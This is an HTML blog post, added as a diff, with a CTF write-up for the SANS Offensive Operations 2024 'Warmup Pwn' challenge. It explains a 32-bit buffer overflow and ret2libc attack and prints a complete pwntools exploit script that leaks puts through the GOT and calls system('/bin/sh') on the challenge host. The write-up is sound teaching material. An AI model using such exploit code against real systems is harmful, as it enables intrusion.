@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://momo1239.github.io/2023/re3-writeup/" />
+  
+  <link rel="canonical" href="https://momo1239.github.io/2024/sans_ctf_writeup/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+  <title>
+       
+       
+           SANS Offensive Operations CTF - Pwn Writeup | Kenny Nguyen (momo)
+       
+  </title>
+  <meta name="title" content="SANS Offensive Operations CTF - Pwn Writeup | Kenny Nguyen (momo)">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SANS Offensive Operations CTF - Pwn Writeup"/>
+<meta name="twitter:description" content="SANS Offensive Operations CTF This was a challenge in the pwn category of the SANS Offensive Operations 2024 CTF. This is a writeup for the challenge &ldquo;Warmup Pwn&rdquo;. Unfortunately, I did not take any screenshots or save the challenge files so I&rsquo;ll mainly be walking through what I did and the script I made.
+Warmup Pwn - First Look The challenge tells us to connect using nc warmup.pwn.site 5005. They provide us with two files: target and libc-2."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SANS Offensive Operations CTF - Pwn Writeup",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/momo1239.github.io\/2024\/sans_ctf_writeup\/"
+  },
+  
+  "genre": "posts",
+  "keywords": "exploit-dev, SANS, ctf",
+  "wordcount":  1017 ,
+  "url": "https:\/\/momo1239.github.io\/2024\/sans_ctf_writeup\/",
+  "datePublished": "2024-02-27T00:00:00\u002b00:00",
+  "dateModified": "2024-02-27T00:00:00\u002b00:00",
+  
+  
+  
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://momo1239.github.io/">Kenny Nguyen (momo)</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://momo1239.github.io/">Kenny Nguyen (momo)</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">SANS Offensive Operations CTF - Pwn Writeup</h1>
+        <div class="post-meta">
+            Written by <a href="https://momo1239.github.io/" rel="author">Momo</a> with ♥
+                <span class="post-time">
+                    on <time datetime=2024-02-27 >27 February 2024</time>
+                </span>
+                in
+                
+                &nbsp;<i class="iconfont icon-timer"></i>
+                5 min
+        </div>
+    </header>
+    <div class="post-content">
+
+        
+
+
+        
+
+        
+
+        
+        
+
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="sans-offensive-operations-ctf">SANS Offensive Operations CTF</h1>
+<p>This was a challenge in the pwn category of the SANS Offensive Operations 2024 CTF. This is a writeup for the challenge &ldquo;Warmup Pwn&rdquo;. Unfortunately, I did not take any screenshots or save the challenge files so I&rsquo;ll mainly be walking through what I did and the script I made.</p>
+<h2 id="warmup-pwn---first-look">Warmup Pwn - First Look</h2>
+<p>The challenge tells us to connect using nc warmup.pwn.site 5005. They provide us with two files: target and libc-2.27.so. Right off the bat I can assume that this will be some sort of ret2libc attack.</p>
+<p>The first thing I&rsquo;ll do when doing these pwn challenges is to make the binary executable, run the file command, and run checksec to see what protections are on the binary.</p>
+<p><code>chmod +x target; file target; checksec target</code></p>
+<p>For this challenge, we&rsquo;ll get an output similar to this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>secureserver: ELF 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>ba7b32f02b9ce5948bcb57c33599de4ad17682de, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Arch:     i386-32-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We can see that our binary is 32bits and is not stripped. We have NX enabled but no PIE which is good. At this point, we could open up a disassembler like ghidra, but I like to run the binary and play with it first.</p>
+<h2 id="gdb-gef---exploiting-a-buffer-overflow">GDB-GEF - Exploiting a Buffer Overflow</h2>
+<p>The binary prints out a string saying system @ (address) and then prompts for user input. I try playing around with the buffer to see if I can crash the program and I get a segmentation fault.</p>
+<p>I like to use GDB-GEF to figure out my offset using pattern create and pattern offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  pattern offset 0x61616174
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;74616161&#39;</span>/<span style="color:#e6db74">&#39;61616174&#39;</span> with period<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found at offset <span style="color:#ae81ff">44</span> <span style="color:#f92672">(</span>little-endian search<span style="color:#f92672">)</span> likely
+</span></span></code></pre></div><p>I find my offset at 44 and test to ensure that I can overwrite the EIP.</p>
+<p><code>$eip   : 0x42424242 (&quot;BBBB&quot;?)</code></p>
+<p>Now that I have control of the instruction pointer I can start putting together a python script to exploit this vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./target&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local:
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;warmup.pwn.site&#39;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">5005</span>
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">44</span>
+</span></span></code></pre></div><p>I know that we have NX/DEP and ASLR enabled. NX/DEP means that we cannot run shellcode directly on the stack and ASLR means that our string and functions will be randomized at runtime.</p>
+<p>In order to handle NX we will use ROP (return oriented programming) and to deal with ASLR we need to leak an address of a pointer to a function in libc and use the libc binary that was provided to calculate the libc base address.</p>
+<h3 id="rop">ROP</h3>
+<p>Return oriented programming is essentially reusing code within a program by redirecting the execution flow of a program through a vulnerability like a buffer overflow to jump to other instructions within a binary.</p>
+<p>We know that the libc library that&rsquo;s used by the program has access to the function <em>system</em>. We can redirect the control flow and call system(&quot;/bin/sh) to trigger a shell.</p>
+<p>However, in order to do so, I have to know the address of system in libc. Due to ASLR, the base addresses of the libraries changes each time the program is executed. In order to find a way to determine the address of system in libc we have to exploit the overflow twice.</p>
+<h3 id="leaking-libc-base-address">Leaking LIBC Base Address</h3>
+<p>First, we will send a payload to overwrite the EIP to call the puts function to print the address of a pointer to a function in libc. Then we&rsquo;ll also have it jump back to the start of the main function so that we can exploit the buffer overflow a second time to redirect the flow to call system(&quot;/bin/sh) and get a shell.</p>
+<p>So we will call the puts function to print a pointer to the terminal.</p>
+<p>We can call puts, but not system, due to the fact the binary was not complied with a position independent code flag, therefore the binary relies on a fixed offset to the procedural linking table (PLT). Any function inside PLT has a static address. The compiler will reference every function used in the binary inside a lookup table called the global offset table (GOT). So puts exists in the PLT, but system does not.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤  disas puts
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> puts@plt:
+</span></span><span style="display:flex;"><span>  0x08049050 &lt;+0&gt;:     jmp    DWORD PTR ds:0x804c014
+</span></span><span style="display:flex;"><span>  0x08049056 &lt;+6&gt;:     push   0x10
+</span></span><span style="display:flex;"><span>  0x0804905b &lt;+11&gt;:    jmp    0x8049020
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>Let&rsquo;s continue building our script to print out the leaked address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gotputs <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>pltputs <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(payload <span style="color:#f92672">+</span> p32(pltputs) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x80491d8</span>) <span style="color:#f92672">+</span> p32(gotputs))
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>leak1 <span style="color:#f92672">=</span> leak[:<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>leak2 <span style="color:#f92672">=</span> u32(leak1)
+</span></span><span style="display:flex;"><span>print(hex(leak2))
+</span></span><span style="display:flex;"><span>wow <span style="color:#f92672">=</span> hex(leak2)
+</span></span></code></pre></div><p>Since PIE is not enabled we can use pwntools to find the addresses of puts in plt and puts in got. We send the first payload that calls puts (PLT) to print out address to puts (GOT).</p>
+<p>We can then use that address and subtract it from the offset of the address of puts in the libc file that was provided to calculate the libc base address.</p>
+<h3 id="here-comes-da-shell">Here Comes Da Shell!</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak2 <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(payload <span style="color:#f92672">+</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(binsh))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>We can use libc.address to automatically use that as our base address with pwntools and easily find the system function and the string &lsquo;/bin/sh&rsquo; in libc and exploit the buffer overflow a second time to return a shell!</p>
+<p>My final exploit script looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./target&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local:
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;warmup.pwn.site&#39;</span>
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">5005</span>
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>gotputs <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>pltputs <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(payload <span style="color:#f92672">+</span> p32(pltputs) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x80491d8</span>) <span style="color:#f92672">+</span> p32(gotputs))
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>leak1 <span style="color:#f92672">=</span> leak[:<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>leak2 <span style="color:#f92672">=</span> u32(leak1)
+</span></span><span style="display:flex;"><span>print(hex(leak2))
+</span></span><span style="display:flex;"><span>wow <span style="color:#f92672">=</span> hex(leak2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak2 <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(payload <span style="color:#f92672">+</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(binsh))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Thanks for reading. Noob out.</p>
+
+    </div>
+
+    <div class="post-copyright">
+        <div class="author">
+            <figure class="author-image">
+                <a href="/about" class="image" alt="MomoDawg">
+                <span class="hidden">About Momo</span></a>
+            </figure>
+        </div>
+
+        <p class="copyright-item">
+            
+            <h4>Share This Post:</h4>
+            <span class="share-icons">
+
+      
+
+      
+
+      
+
+      
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmomo1239.github.io%2f2024%2fsans_ctf_writeup%2f&amp;title=SANS%20Offensive%20Operations%20CTF%20-%20Pwn%20Writeup" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>&nbsp;
+        
+
+      
+
+      
+
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+        </p>
+                    
+
+        
+    </div>
+
+
+    <div class="post-tags">
+        
+        <section>
+            <i class="iconfont icon-icon-tag"></i>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/exploit-dev/">exploit-dev</a></span>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/sans/">SANS</a></span>
+            
+            &nbsp;&nbsp;<span class="tag"><a href="https://momo1239.github.io/tags/ctf/">ctf</a></span>
+            
+        </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> ·
+                <span><a href="https://momo1239.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://momo1239.github.io/2023/re3-writeup/" class="prev" rel="prev" title="Reverse Engineering Level 3 Writeup"><i class="iconfont icon-dajiantou"></i>&nbsp;Reverse Engineering Level 3 Writeup</a>
+        
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+  
+
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="footer-social"> Get in touch: 
+<a href="https://github.com/momo1239" target="_blank" rel="me noopener noreferrer"><i class="iconfont icon-github"></i></a>
+
+
+<a href="https://linkedin.com/in/kenny-nguyen-2a3022152" target="_blank" rel="me noopener noreferrer"><i class="iconfont icon-linkedin"></i></a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ </div>
+    <div class="copyright" itemscope>
+        &copy;
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://momo1239.github.io/">Momo</a> | </span>
+         
+
+          <span>🛠️ with <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hugo</a> | Based on <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreferrer">KeepIt</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
